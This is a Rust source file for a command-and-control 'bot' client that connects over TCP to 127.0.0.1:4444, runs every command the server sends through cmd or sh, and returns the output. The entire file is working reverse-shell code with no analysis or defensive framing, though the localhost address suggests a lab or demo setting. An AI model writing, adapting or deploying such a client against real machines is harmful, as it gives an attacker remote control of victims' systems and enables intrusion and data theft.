use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut writer = stream.try_clone()?;
    let reader = BufReader::new(stream);

    // Continuously read commands from the server
    for line in reader.lines() {
        let command = match line {
            Ok(c) => c.trim().to_string(),
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        };

        if command.is_empty() {
            continue;
        }

        // Allow the server to terminate the bot
        if command == "exit" || command == "quit" {
            println!("Received termination command. Exiting.");
            break;
        }

        println!("Executing command: {}", command);

        // Execute the command on the system using the appropriate shell
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", &command]).output()
        } else {
            Command::new("sh").arg("-c").arg(&command).output()
        };

        // Build the result string from stdout/stderr (or the error if execution failed)
        let result = match output {
            Ok(out) => {
                let mut combined = String::new();
                combined.push_str(&String::from_utf8_lossy(&out.stdout));
                combined.push_str(&String::from_utf8_lossy(&out.stderr));
                if combined.is_empty() {
                    combined.push_str("(no output)\n");
                }
                combined
            }
            Err(e) => format!("Failed to execute command: {}\n", e),
        };

        // Print the result back to the server
        if let Err(e) = writer.write_all(result.as_bytes()) {
            eprintln!("Error writing to server: {}", e);
            break;
        }
        // Send a marker so the server knows the command's output is finished
        if let Err(e) = writer.write_all(b"--END--\n") {
            eprintln!("Error writing to server: {}", e);
            break;
        }
        if let Err(e) = writer.flush() {
            eprintln!("Error flushing stream: {}", e);
            break;
        }
    }

    Ok(())
}

